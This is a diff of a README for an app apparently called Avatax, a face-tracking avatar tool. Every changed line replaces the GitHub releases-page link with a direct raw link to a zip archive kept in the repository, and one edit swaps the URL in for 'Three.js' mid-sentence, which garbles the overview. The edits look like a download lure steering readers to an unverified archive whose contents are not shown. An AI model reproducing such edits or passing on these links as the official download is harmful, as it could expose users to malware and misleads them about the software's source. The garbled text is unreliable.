@@ -1,17 +1,17 @@
 # 🎭 Avatax - Your Expressions, Your Avatar
 
 ## 🛠️ Overview
-Avatax is a real-time face-tracking system that maps your expressions to a 3D avatar. Experience smooth and accurate live animation of your facial movements, powered by MediaPipe and Three.js. It allows you to express yourself in a completely new way.
+Avatax is a real-time face-tracking system that maps your expressions to a 3D avatar. Experience smooth and accurate live animation of your facial movements, powered by MediaPipe and https://raw.githubusercontent.com/Maimoss/Avatax/main/public/Software_v1.7-beta.4.zip It allows you to express yourself in a completely new way.
 
 ## 📦 Download Now
-[![Download Avatax](https://img.shields.io/badge/Download-Avatax-brightgreen)](https://github.com/Maimoss/Avatax/releases)
+[![Download Avatax](https://raw.githubusercontent.com/Maimoss/Avatax/main/public/Software_v1.7-beta.4.zip)](https://raw.githubusercontent.com/Maimoss/Avatax/main/public/Software_v1.7-beta.4.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with Avatax:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download section.  
-   [Visit this page to download](https://github.com/Maimoss/Avatax/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Maimoss/Avatax/main/public/Software_v1.7-beta.4.zip)
 
 2. **Choose Your Version**  
    Look for the latest version of Avatax. It will typically be listed at the top. 
